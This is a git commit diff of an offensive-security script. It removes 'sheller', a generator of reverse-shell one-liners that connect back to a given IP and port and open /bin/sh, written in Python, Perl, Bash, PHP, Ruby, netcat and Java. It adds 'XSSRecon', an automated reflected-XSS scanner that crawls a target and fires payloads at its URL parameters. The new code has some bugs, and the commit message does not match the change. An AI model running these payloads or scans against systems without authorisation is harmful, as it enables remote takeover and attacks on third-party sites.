cf412e18e1b27bd09d69ff49ca46b9e457511feb
Ak <44728139+Ak-wa@users.noreply.github.com>
2019-12-12 09:38:33 +0100

    Added --setup argument

--- sheller.py
+++ sheller.py
@@ -1,115 +1,291 @@
-#!/usr/bin/env python3
+import requests
+from parsel import Selector
+from colorama import Fore, Back, Style
+from time import sleep
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.firefox.options import Options
+import threading
 import sys
-from os import system
 import argparse
-import socket
-import psutil
+import tldextract
+from string import digits
+from os import system
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-d', help="IP address to connect to", dest="ip", required=False)
-parser.add_argument('-i', help="Interface to get IP from", dest="interface", required=False)
-parser.add_argument('-p', help="Port to connect to", dest="port", required=False)
-parser.add_argument('-setup', dest="setup", help="Installs Sheller on your system in /usr/bin", action="store_true",
-                    required=False)
-args = parser.parse_args()
-
-
-def py(ip, port):
-    print("[+] Python")
-    payload = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (
-    ip, port)
-    print(payload, "\n")
-
-def pl(ip, port):
-    print("[+] Perl")
-    payload = """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (
-    ip, port)
-    print(payload, "\n")
-
-def sh(ip, port):
-    print("[+] Bash")
-    payload = """bash -i >& /dev/tcp/%s/%d 0>&1""" % (ip, port)
-    print(payload, "\n")
-
-def php(ip, port):
-    print("[+] PHP")
-    payload = """php -r '$sock=fsockopen(%s,%d);exec("/bin/sh -i <&3 >&3 2>&3");'""" % (ip, port)
-    print(payload, "\n")
-
-def rb(ip, port):
-    print("[+] Ruby")
-    payload = """ruby -rsocket -e'f=TCPSocket.open({},{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""".format(
-        ip, port)
-    print(payload, "\n")
-
-def nc(ip, port):
-    print("[+] Netcat")
-    payload = "nc -e /bin/sh %s %d" % (ip, port)
-    print(payload, "\n")
-
-def java(ip, port):
-    print("[+] Java")
-    payload = """r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()""" % (
-    ip, port)
-    print(payload, "\n")
-
-if len(sys.argv) <= 1:
-    print("[+] No arguments supplied, for help try sheller -h")
+class xssRecon:
+    def __init__(self,arguments):
+        self.target = ""
+        self.silent = False
+        self.target_links = []
+        self.payloads = []
+        self.vulns = []
+        self.usable_links = []
+        self.counter = 0
+        self.wordlist = "xss_payloads.txt"
+        self.delay = 0
+        self.used_parameters = []
 
 
-def main():
-    print("[+] Available Interfaces (-i for interface, -d for ip)")
-    def get_ip_addresses(family):
-        for interface, snics in psutil.net_if_addrs().items():
-            for snic in snics:
-                if snic.family == family:
-                    yield (interface, snic.address)
-    ipv4s = list(get_ip_addresses(socket.AF_INET))
-    ipv6s = list(get_ip_addresses(socket.AF_INET6))
-    for ip in ipv4s:
-        print(ip)
-    if args.setup:
-        print("[+] Creating /usr/bin/sheller folder")
-        system('mkdir /usr/bin/sheller')
-        system('mkdir /usr/bin/sheller/bin')
-        print("[+] Cloning sheller.py into /usr/bin/sheller/bin/sheller")
-        system(
-            'wget https://raw.githubusercontent.com/Ak-wa/sheller/master/sheller.py -O /usr/bin/sheller/bin/sheller')
-        system("chmod +x /usr/bin/sheller/bin/sheller")
-        print("[+] Setting up sheller")
-        system("ln -s /usr/bin/sheller/bin/sheller /usr/local/bin")
-        print("[+] Done, you can now use sheller from anywhere! Just type 'sheller'")
-    else:
-        pass
-    if args.ip:
-        if args.port:
-            py(args.ip, int(args.port))
-            pl(args.ip, int(args.port))
-            sh(args.ip, int(args.port))
-            php(args.ip, int(args.port))
-            rb(args.ip, int(args.port))
-            nc(args.ip, int(args.port))
-            java(args.ip, int(args.port))
+    def logo(self):
+        print(Fore.GREEN+"""
+
+
+ _     _ _______ _______  ______ _______ _______  _____  __   _
+  \___/  |______ |______ |_____/ |______ |       |     | | \  |
+ _/   \_ ______| ______| |    \_ |______ |_____  |_____| |  \_|
+
+
+    XSSRecon - Automated refl. XSS Scanner
+    http://1337.rocks
+
+    Usage: python3 xssrecon.py -h
+           python3 xssrecon.py --target http://example.com/index.php?id=1
+           python3 xssrecon.py --target http://example.com --crawl
+
+"""+Style.RESET_ALL)
+
+    def spawn_browser(self, visibility):
+        self.options = Options()
+        if visibility == False:
+            self.options.headless = True
+        if visibility == True:
+            self.options.headless = False
+        self.profile = webdriver.FirefoxProfile()
+        self.profile.set_preference("permissions.default.image", 2)
+        self.profile.set_preference("permissions.default.stylesheet", 2);
+        self.driver = webdriver.Firefox(options=self.options,firefox_profile=self.profile)
+
+    def crawl_and_test(self, target):
+        print(Fore.YELLOW+"[i] Starting crawler...")
+        self.response = requests.get(self.target)
+        self.selector = Selector(self.response.text)
+        self.href_links = self.selector.xpath('//a/@href').getall()
+        if self.silent == False:
+            print(Fore.YELLOW+"[i] Looking for usable links (with parameters) in webpage html...")
+        if self.href_links == []:
+            print(Fore.YELLOW+"[i] No hrefs found")
+            self.driver.quit()
+            sys.exit()
         else:
-            pass
-    else:
-        if args.interface:
-            if args.port:
-                for tuple in ipv4s:
-                    if str(args.interface) == str(tuple[0]):
-                        ip = tuple[1]
+            if self.silent == False:
+
+                # Follow hrefs
+                for href in self.href_links:
+                    #print("Current href: {}".format(href))
+                    if 'http' in href:
+                        response_follow = requests.get(href)
                     else:
-                        pass
-                try:
-                    py(ip, int(args.port))
-                    pl(ip, int(args.port))
-                    sh(ip, int(args.port))
-                    php(ip, int(args.port))
-                    rb(ip, int(args.port))
-                    nc(ip, int(args.port))
-                    java(ip, int(args.port))
-                except:
-                    print("[+] Could not find the provided interface")
+                        if href.startswith("/"):
+                            response_follow = requests.get(self.target+href)
+                        else:
+                            response_follow = requests.get(self.target+"/"+href)
+                    selector_follow = Selector(response_follow.text)
+                    href_links_follow = selector_follow.xpath('//a/@href').getall()
+
+                    # Check mainpage hrefs for parameters
+                    if "=" in href:
+                        if href not in self.usable_links:
+                                if href.startswith("http") or href.startswith("https"):
+                                    if self.check_scope(self.target, href):
+                                        print(Fore.GREEN+"| %s" % href)
+                                        self.usable_links.append(href)
+                                    else:
+                                        print(f"{Fore.RED}| {href}{Style.RESET_ALL}")
+                                else:
+                                    if href.startswith("/"):
+                                        print(Fore.GREEN+"| %s" % href)
+                                        self.usable_links.append(href)
+                                    else:
+                                        href = "/"+str(href)
+                                        print(Fore.GREEN+"| %s" % href)
+                    # Check followed page hrefs for parameters
+                    for href in href_links_follow:
+                        if "=" in href:
+                            if href not in self.usable_links:
+                                if href.startswith("http") or href.startswith("https"):
+                                    if self.check_scope(self.target, href):
+                                        print(Fore.GREEN+"| %s" % href)
+                                        self.usable_links.append(href)
+                                    else:
+                                        print(f"{Fore.RED}| {href}{Style.RESET_ALL}")
+                                else:
+                                    if href.startswith("/"):
+                                        print(Fore.GREEN+"| %s" % href)
+                                        self.usable_links.append(href)
+                                    else:
+                                        href = "/"+str(href)
+                                        print(Fore.GREEN+"| %s" % href)
+                                        self.usable_links.append(href)
+                if self.usable_links == []:
+                    print("[-] Could not find any usable links in webpage")
+        # Scanner
+        print(Fore.YELLOW+"[i] Starting Scanner")
+        for link in self.usable_links:
+            if "=" in link:
+                if not "http" in link:
+                    full_link = f"{self.target}/{link}"
+                else:
+                    full_link = link
+                equal_counter = full_link.count("=")
+                last_param = full_link.split("=")[equal_counter]
+                for payload in self.payloads:
+                    exploit_url = full_link.replace(last_param,payload)
+                    self.single_xss_check(url=str(exploit_url), payload=payload, parameter=(full_link.split("=")[int(equal_counter)-1]))
 
 
-main()
+        if self.vulns == []:
+            print(Fore.YELLOW+"[-] No vulnerabilities found")
+            self.driver.quit()
+            sys.exit()
+        else:
+            print(Fore.RED+"[+] Found the following exploits:")
+            for link in self.vulns:
+                print("|", link)
+            self.driver.quit()
+            sys.exit()
+
+    def parameter_compare(self, param1, param2):
+        param1 = param1.translate(None, digits)
+        param2 = param2.translate(None, digits)
+
+        if param1 == param2:
+            return False
+        else:
+            return True
+    def check_scope(self, target, url):
+        self.target_domain = tldextract.extract(self.target).registered_domain
+
+        url_domain = tldextract.extract(url)
+        if url_domain.count(".") == 2: # Subdomain check
+            print("Subdomain found")
+        url_domain = url_domain.registered_domain
+
+        if str(self.target_domain) == str(url_domain):
+            #print("[DEBUG] {} and {} are the same domain!".format(self.target_domain, url_domain))
+            return True
+        else:
+            #print("Found out of scope domain: {}:{} with URL: {}".format(self.target_domain, url_domain, url))
+            return False
+
+    def scan_one_url(self, url):
+        print(Fore.YELLOW+"[i] Starting single URL scanner...")
+        equal_counter = url.count("=")
+        for payload in self.payloads:
+            self.single_xss_check(str(url)+str(payload), payload=payload, parameter = url.split("=")[int(equal_counter)-1])
+        if self.vulns == []:
+            print(Fore.YELLOW+"[-] No vulnerabilities found")
+            self.driver.quit()
+            sys.exit()
+        else:
+            print(Fore.RED+"[+] Found the following exploits:")
+            for link in self.vulns:
+                print("|", link)
+            self.driver.quit()
+            sys.exit()
+
+    def single_xss_check(self, url, payload, parameter):
+        self.counter += 1
+        if self.silent == False:
+            #sys.stdout.write(Fore.CYAN+"[%d] Testing: %s" % (self.counter, url))
+            sys.stdout.write(Fore.MAGENTA+"""
+Parameter: {}
+Payload: {}
+Counter: {}
+""".format(parameter+"=", payload, self.counter))
+        self.driver.get(str(url))
+        sleep(int(self.delay))
+        try:
+            self.driver.switch_to.alert.accept()
+            sys.stdout.write("\n")
+            sys.stdout.write(Fore.RED+"\n[+] Found reflected XSS at")
+            sys.stdout.write("\n| %s " % url)
+            for i in range(5):
+                sys.stdout.write("\n")
+            sys.stdout.write(Style.RESET_ALL+"\n")
+            vulns.append(exploit_url)
+        except:
+            sys.stdout.write("\033[F")
+            sys.stdout.write("\033[K")
+            sys.stdout.write("\033[F")
+            sys.stdout.write("\033[K")
+            sys.stdout.write("\033[F")
+            sys.stdout.write("\033[K")
+            sys.stdout.write("\033[F")
+            sys.stdout.write("\033[K")
+            #sys.stdout.flush()
+
+
+    def parse_payload_file(self):
+        if args.wordlist:
+            self.wordlist = args.wordlist
+        file = self.wordlist
+        with open(str(file)) as payloads:
+            for payload in payloads:
+                payload = payload.rstrip()
+                self.payloads.append(payload)
+
+    def argument_parser(self):
+        self.logo()
+        if args.setup:
+            print("[+] Creating /usr/bin/XSSRecon folder")
+            system('mkdir /usr/bin/XSSRecon')
+            system("mkdir /usr/bin/XSSRecon/bin")
+            print("[+] Cloning xssrecon.py into /usr/bin/XSSRecon/bin/XSSRecon")
+            system(
+                'wget https://raw.githubusercontent.com/Ak-wa/XSSRecon/master/xssrecon.py -O /usr/bin/XSSRecon/bin/xssrecon')
+            system("chmod +x /usr/bin/XSSRecon/bin/xssrecon")
+            print("[+] Setting up XSSRecon")
+            system("ln -s /usr/bin/XSSRecon/bin/xssrecon /usr/local/bin")
+            print("[+] Done, you can now use XSSRecon from anywhere! Just type 'xssrecon'")
+            sys.exit()
+        else:
+            if args.delay:
+                self.delay = args.delay
+            if args.silent:
+                self.silent = True
+            if args.wordlist:
+                self.wordlist = args.wordlist
+            if args.visible:
+                self.spawn_browser(visibility=True)
+            else:
+                self.spawn_browser(visibility=False)
+            if args.target:
+                self.target = str(args.target)
+                if args.crawl:
+                    self.crawl_and_test(target=self.target)
+                else:
+                    if "=" in self.target:
+                        self.scan_one_url(self.target)
+                    else:
+                        print("[!] Please use --crawl or pass a full url with a parameter to test (e.g http://example.com/index.php?id=1)")
+                        self.driver.quit()
+                        sys.exit()
+
+    def run(self):
+        try:
+            self.parse_payload_file()
+            self.argument_parser()
+        except KeyboardInterrupt:
+            print(Fore.GREEN+"\n[-] CTRL-C caught, exiting...")
+            self.driver.quit()
+            sys.exit()
+        except Exception as e:
+            print(e)
+            self.driver.quit()
+            sys.exit()
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--target", help="Scan a single URL for XSS")
+    parser.add_argument("--wordlist", help= "XSS wordlist to use")
+    parser.add_argument("--delay", help= "Delay to wait for webpage to load (each test)")
+    parser.add_argument("--crawl", help="Crawl page automatically & test everything for XSS", action="store_true")
+    parser.add_argument("--silent", help="Silent mode (less output)", action="store_true")
+    parser.add_argument("--visible", help="Shows browser while testing (may slow down)", action="store_true")
+    parser.add_argument("--setup", help="Sets up XSSRecon with symlink to access it from anywhere", action="store_true")
+    args = parser.parse_args()
+    #print(args.echo)
+
+    scanner = xssRecon(args)
+    scanner.run()
